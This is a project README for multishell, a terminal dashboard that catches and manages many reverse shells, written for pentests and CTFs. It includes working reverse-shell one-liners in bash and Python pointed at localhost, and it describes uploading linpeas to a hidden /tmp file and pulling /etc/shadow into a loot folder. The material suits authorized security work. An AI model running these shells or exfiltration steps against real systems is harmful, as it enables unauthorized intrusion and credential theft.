# multishell

> Multi-session reverse-shell handler with a terminal dashboard.
> Think pwncat, but with search, replay, persistence, and a nicer TUI.

```
┌──────────────────────┬──────────────────────────────────────────────────┐
│ [ SESSIONS ]         │ #3  web-prod-01  ● LIVE  rx 12.3K tx 842B        │
│ #1 ✗ old-box          │──────────────────────────────────────────────────│
│ #2 ● kiosk-07         │ USER  alice@victim-01     SHELL  /bin/bash      │
│ #3 ● web-prod-01 ★    │ OS    Linux 6.5 x86_64    CWD    /home/alice    │
│ #4 · (archived)       │ NOTE  rails secret_key_base at /opt/app/.env    │
│                       │──────────────────────────────────────────────────│
│                       │ alice@victim-01:~$ id                           │
│                       │ uid=1000(alice) gid=1000(alice) groups=1000     │
│                       │ alice@victim-01:~$ sudo -l                      │
│                       │ (bash) ALL : ALL NOPASSWD: /usr/bin/tar         │
│ TCP 0.0.0.0:9090 ●    │──────────────────────────────────────────────────│
│  LISTENING            │ web-prod-01 ❯ /put ~/tools/linpeas.sh /tmp/.x   │
└──────────────────────┴──────────────────────────────────────────────────┘
 Ctrl+K palette  Ctrl+F search  F2 rename  Ctrl+U PTY  Ctrl+X kill
```

---

## What it is

A listener + dashboard for offensive security work: start one TUI,
have many reverse shells connect to the same port, drive each one from
a common interface. Built for pentests, CTFs, red-team labs, and
research — **not** a C2 framework.

## Why

The tools I wanted to like:

- **`nc -lvp 9090`** — one connection at a time. If a second shell lands
  while I'm in the first, I either miss it or lose the first.
- **Metasploit `multi/handler`** — multi-session, but wired into msf's
  world; heavyweight for "just catch shells".
- **pwncat-cs** — great tool, but the UX is a single prompt, no history
  pane, no search across sessions, and drops everything when it exits.

I wanted: multi-session, persistent, searchable, replayable, with
usable file transfer and a dashboard that doesn't get in the way.

## Features

- **Many sessions on one port** — every callback becomes a session
  in the sidebar. Cycle with `Ctrl+N` / `Ctrl+P`.
- **Persistent history** — every session writes raw bytes, an asciinema
  `.cast`, and a metadata sidecar. Past sessions auto-load on startup as
  read-only "archived" entries you can browse, search, tag, and note.
- **Search everything** (`Ctrl+F`) — regex across every session's
  scrollback, live *and* archived. Jump straight to the hit.
- **Structured fingerprint** — on connect, auto-probes OS / user /
  hostname / shell / cwd via a sentinel-delimited echo and renders a
  compact info panel.
- **Bulletproof PTY upgrade** (`Ctrl+U`) — `python3` → `python` →
  `script`, OS-branched so BSD/Darwin `script(1)` syntax and
  Linux syntax both work. Confirmed with a post-upgrade sentinel.
- **Reconnect with a fresh PTY** (`/pty --reconnect`) — instead of
  wrapping the existing dumb shell in-place, fire a `socat`/`python3`
  payload that opens a *new* socket back to the listener with a real
  PTY around bash. Lands as a brand-new session — cleaner process tree.
- **Raw-interact mode** (`Ctrl+G`) — suspend the TUI, drop your local
  terminal into raw mode, and forward every byte directly between
  stdin and the session socket. `vim`, `htop`, `tab` completion,
  history, and `Ctrl+C` all work as expected. Press `Ctrl+G` again
  to return to the dashboard.
- **File transfer** — `/put ~/linpeas.sh /tmp/.x` (base64 heredoc, sha256
  verify, sentinel framing). `/get /etc/shadow` → drops into
  `~/.multishell/loot/session-NNNN/`.
- **Command palette** (`Ctrl+K`) — fuzzy-find any action, including
  "switch to session #N".
- **Rename + sticky notes** — `F2` / `Ctrl+O`, persisted across runs.
- **Session cleanup** — `Ctrl+X` drops a dead or live session; `/prune`
  wipes every non-live one.
- **Recorded evidence** — every session becomes a v2 asciinema `.cast`,
  replayable with `asciinema play`.
- **Hacker theme** — dark charcoal with cyan / phosphor / amber / hot-pink
  accents, done as a proper Textual theme.

Companion cheat sheet: [`docs/REVERSE_SHELLS.md`](docs/REVERSE_SHELLS.md) —
payloads for bash, nc, python, PHP, Flask SSTI, PowerShell, Go, msfvenom,
LOLBins, DNS/TLS tunnels, encoding tricks, and blue-team detection signals.

## Install

### Clone and run (zero-touch, ideal over SSH)

```sh
git clone https://github.com/syndis/Monkey-Business
cd Monkey-Business/multishell
./run.sh
```

`run.sh` is self-bootstrapping: on first run it creates `.venv/`,
installs multishell in editable mode, and execs the entry point.
Subsequent runs skip straight to launch. Pass any flag through:

```sh
./run.sh -p 4444 --no-history
```

Designed for the "SSH into a fresh box, clone, launch inside tmux" flow —
no global state, nothing to install outside the checkout.

### System-wide install (PATH symlink)

```sh
./install.sh
```

Creates `.venv/`, installs editable, and symlinks `multishell` into
`~/.local/bin/`. Override with `MULTISHELL_BIN_DIR=…`. Needs Python 3.11+.

### With `uv` (faster)

```sh
uv venv && uv pip install -e .
./.venv/bin/multishell
```

### Via `make`

```sh
make install        # = ./install.sh
make install-dev    # + pytest + ruff
make run            # launch with defaults
make run PORT=4444  # override
make test
```

## Running over SSH / inside tmux or screen

multishell is built to run on the box you're operating from, including
inside `tmux` / `screen` over SSH:

- The default keybindings (`Ctrl+N/P/F/U/G/X/K/Q`) don't collide with the
  default tmux (`Ctrl+B`) or screen (`Ctrl+A`) prefix. Inside a multiplexer
  the startup banner surfaces a tip with the exit sequence for raw-interact.
- Custom theme registration is skipped automatically when `TERM=dumb`,
  unset, or `NO_COLOR` is set, so a stripped-down SSH session still launches.
- Raw-interact mode (`Ctrl+G` / `/raw`) needs a real TTY; if it ever looks
  frozen, exit it with `Ctrl+]` and you're back in the dashboard.

## Quickstart

In terminal 1:

```sh
multishell              # listen on 0.0.0.0:9090
```

In terminal 2 (fake a victim — pick a **non-interactive** shell, see note below):

```sh
bash -c 'bash -i >& /dev/tcp/127.0.0.1/9090 0>&1'
```

> **Avoid for testing**: `python3 -c '... pty.spawn("/bin/zsh")'` and friends.
> They inherit your interactive zsh's `.zshrc`, theme, and `zle` editor —
> which produce ANSI cursor escapes that don't render cleanly in a
> line-based scrollback, and whose input handling clashes with our
> fingerprint probe. Use `/bin/sh -i` instead, then `Ctrl+U` for PTY:
> `python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect(("127.0.0.1",9090));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`

A session appears in the sidebar. In the TUI:

1. `Ctrl+U` — upgrade to a PTY.
2. `F2` — rename to something you'll remember (`web-prod-01`).
3. `Ctrl+O` — leave yourself a note.
4. `/put ~/tools/linpeas.sh /tmp/.x` — drop a tool.
5. `/get /etc/passwd` — exfil into loot.
6. `Ctrl+F` — later, regex-search across every session you've ever had.

## Keybindings

| Key            | Action                                  |
| -------------- | --------------------------------------- |
| `Ctrl+N` / `Ctrl+P` | next / previous session             |
| `F2` (or `Ctrl+T`)  | rename (tag) the current session    |
| `Ctrl+O`       | edit sticky note                        |
| `Ctrl+U`       | PTY upgrade (in-place)                  |
| `Ctrl+G`       | raw-interact mode (vim / htop / tab / Ctrl+C work) |
| `Ctrl+F`       | global scrollback search (regex)        |
| `Ctrl+K`       | command palette                         |
| `Ctrl+X`       | kill + remove current session           |
| `Ctrl+Q` / `Esc` | quit                                  |
| `↑` / `↓` in sidebar | switch session                    |

## Slash commands

Type into the bottom input.

| Command               | Purpose                                                |
| --------------------- | ------------------------------------------------------ |
| `/help`               | list commands inside the scrollback                    |
| `/put <local> [remote]` | upload a file                                        |
| `/get <remote>`       | download a file to `~/.multishell/loot/session-NNNN/`  |
| `/tag <name>` (or `/rename`) | rename session                                  |
| `/note <text>`        | sticky note                                            |
| `/pty [shell]`        | PTY upgrade in-place (optional shell override)         |
| `/pty --reconnect [host:port]` | spawn a callback shell with a fresh PTY        |
| `/raw` (or `/interact`) | enter raw-interact mode — same as Ctrl+G             |
| `/fp`                 | re-run fingerprint                                     |
| `/kill`               | disconnect + remove current                            |
| `/prune`              | remove every non-live session                          |

Anything not starting with `/` is sent as a line (with a trailing `\n`)
to the currently selected live session.

## CLI flags

```
multishell [-p PORT] [-b BIND] [--no-history] [-V]

  -p, --port        listen port (default 9090)
  -b, --bind        interface to bind on (default 0.0.0.0 — all interfaces;
                    use 127.0.0.1 for local-only)
  --no-history      don't load archived sessions on startup
  -V, --version     print version and exit
```

## Where things live

| Path                                            | What                            |
| ----------------------------------------------- | ------------------------------- |
| `~/.multishell/sessions/<ts>-<id>-<ip>.log`     | raw byte log, per session       |
| `~/.multishell/sessions/<ts>-<id>-<ip>.cast`    | asciinema v2 replay             |
| `~/.multishell/sessions/<ts>-<id>-<ip>.meta.json` | tag, note, fingerprint        |
| `~/.multishell/loot/session-<id>/`              | files downloaded with `/get`    |

The data dir is `chmod 700`; log files `chmod 600`.

## Architecture

```
     ┌──────────────┐
     │ TCPListener  │  asyncio.start_server on (host, port)
     └──────┬───────┘
            │ accept
            ▼
   ┌────────────────┐     on_add / on_data / on_close / on_remove
   │ SessionRegistry├───────────────────────────┐
   └────────┬───────┘                           │
            │                                   ▼
      Session (bytes ↔ socket)          Textual App (TUI)
      scrollback deque                  sidebar · scrollback · prompt
      raw .log + .cast + .meta.json     search · palette · modals
```

The three layers stay decoupled — the core (`session.py`, `listener.py`,
`transfer.py`, `fingerprint.py`) never imports Textual. You can drive it
from plain scripts.

## Project layout

```
multishell/
├── LICENSE
├── README.md
├── CHANGELOG.md
├── Makefile
├── install.sh
├── pyproject.toml
├── docs/
│   └── REVERSE_SHELLS.md       # 15-section payload cheat sheet
├── src/multishell/
│   ├── __main__.py             # argparse entry
│   ├── config.py               # paths, ports, limits
│   ├── listener.py             # async TCP accept loop + DoS guard
│   ├── session.py              # Session dataclass + registry
│   ├── fingerprint.py          # OS probe + PTY upgrade
│   ├── transfer.py             # /put + /get with sentinel framing
│   └── tui/
│       ├── app.py              # Textual App
│       ├── modals.py           # search + prompt modal
│       ├── palette.py          # command palette Provider
│       └── styles.tcss
└── tests/                      # pytest
```

## Security notes

- **Default bind is `0.0.0.0`** (all interfaces) because reverse shells
  usually need to be reachable from the LAN. Use `-b 127.0.0.1` for
  local-only listening.
- **No authentication** in v0.1 — anyone who probes your port becomes a
  session in the sidebar. A roadmap item is HMAC handshake (first N
  bytes must match a shared secret, else drop the connection).
- **Target is untrusted** — the scrollback shows whatever the target
  sends, including ANSI escape sequences. Rich's `Text.from_ansi`
  parser is used; it handles CSI but a hostile target could still
  attempt terminal manipulation. Run multishell in a disposable
  terminal or tmux session if you're catching callbacks from boxes
  you don't trust.
- **Logs contain loot.** Data dirs are `chmod 700`, files `chmod 600`.
  If you're on a shared host, consider `DATA_DIR` on a LUKS volume.
- **File transfer uses the same socket** as the shell. A monitoring
  IDS will see base64 blobs. Future v2: out-of-band HTTPS transport.

## Roadmap

v2 (next up):

- TLS listener + optional HMAC handshake (drop scanner noise).
- Regex triggers — "if session emits `password:`, auto-send `$PW\n`".
- YAML playbooks — declarative post-connect actions (per-OS).
- Report export — per-session markdown/HTML with timeline + commands + loot.
- Out-of-band HTTP file transfer — auto-probe capabilities, pick
  fastest transport; chunked + resumable.
- Streaming ANSI parser — current `from_ansi` is per-chunk and can
  glitch on escape sequences split across reads.

v3:

- Multi-operator attach via Unix socket (two operators, one handler).
- Pivot / chain — use a live session as transport for a new listener
  inside the target's network; per-session SOCKS5.
- Loot vault with sha256 dedup across hosts.
- Plugin API (hot-reloadable Python classes).
- UDP pseudo-session demux (`(src_ip, src_port)` → virtual session).

## License

MIT — see [LICENSE](LICENSE).

## Ethics

For authorized security testing only. Know your targets, know your
scope, keep your contracts. If you're about to point this at a system
you don't own or haven't been asked to test: stop.
